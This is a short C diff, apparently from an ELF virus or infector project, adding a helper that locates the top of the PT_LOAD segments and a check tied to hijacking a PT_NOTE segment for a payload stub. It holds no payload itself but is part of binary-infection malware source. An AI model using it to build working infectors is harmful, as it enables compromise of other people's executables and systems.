@@ -14,6 +14,31 @@ int is_valid_elf(const Elf64_Ehdr *elf)
 	return (1);
 }
 
+static uint64_t page_round_up(uint64_t x)
+{
+	return ((x + PAGE_SIZE - 1) & ~((uint64_t)PAGE_SIZE - 1));
+}
+
+/*
+* @brief Highest vaddr any PT_LOAD occupies at runtime, rounded up to a page.
+*/
+uint64_t	highest_vaddr_end(const t_famine *f)
+{
+	uint64_t	top;
+	uint64_t	end;
+
+	top = 0;
+	for (int i = 0; i < f->ehdr->e_phnum; i++)
+	{
+		if (f->phdr[i].p_type != PT_LOAD)
+			continue ;
+		end = f->phdr[i].p_vaddr + f->phdr[i].p_memsz;
+		if (end > top)
+			top = end;
+	}
+	return (page_round_up(top));
+}
+
 int find_segments(t_famine *f)
 {
 	f->note = NULL;
@@ -27,5 +52,7 @@ int find_segments(t_famine *f)
 	}
 	if (!f->note)
 		return (LOG("no PT_NOTE segment to hijack\n"), 1);
+	if (f->stub_vaddr == 0)
+		return (LOG("no PT_LOAD segment found\n"), 1);
 	return (0);
 }
